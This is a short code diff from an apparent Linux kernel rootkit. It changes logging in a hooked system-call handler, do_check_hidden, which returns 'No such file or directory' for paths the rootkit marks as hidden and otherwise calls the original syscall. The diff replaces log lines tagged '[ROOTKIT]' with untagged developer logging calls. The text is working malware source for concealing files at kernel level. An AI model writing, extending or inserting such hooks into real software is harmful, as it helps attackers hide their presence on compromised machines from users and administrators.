@@ -40,11 +40,11 @@ long do_check_hidden(const sysfun_t orig_func, struct pt_regs *const p_regs, con
     s_filename_k = strndup_user(s_filename, PATH_MAX);
 
     IF_U (IS_ERR_OR_NULL(s_filename_k)) {
-        pr_err("[ROOTKIT] * Could not copy filename from user\n");
+        pr_dev_err("* Could not copy filename from user\n");
         s_filename_k = kstrdup_const("(unknown)", GFP_KERNEL);
     }
 
-    pr_info("[ROOTKIT] * File name: %s\n", s_filename_k);
+    pr_dev_info("* File name: %s\n", s_filename_k);
 
     kfree_const(s_filename_k);
 
@@ -61,13 +61,13 @@ long do_check_hidden(const sysfun_t orig_func, struct pt_regs *const p_regs, con
     }
 
     IF_U (is_pathname_hidden(i32_dfd, s_filename, ui32_lookup_flags)) {
-        pr_info("[ROOTKIT]     * Hiding file\n");
+        pr_dev_info("    * Hiding file\n");
 
         return -ENOENT; // No such file or directory
     }
 
     i64_ret = orig_func(p_regs);
-    pr_info("[ROOTKIT] * Return value: %ld\n", i64_ret);
+    pr_dev_info("* Return value: %ld\n", i64_ret);
 
     return i64_ret;
 }
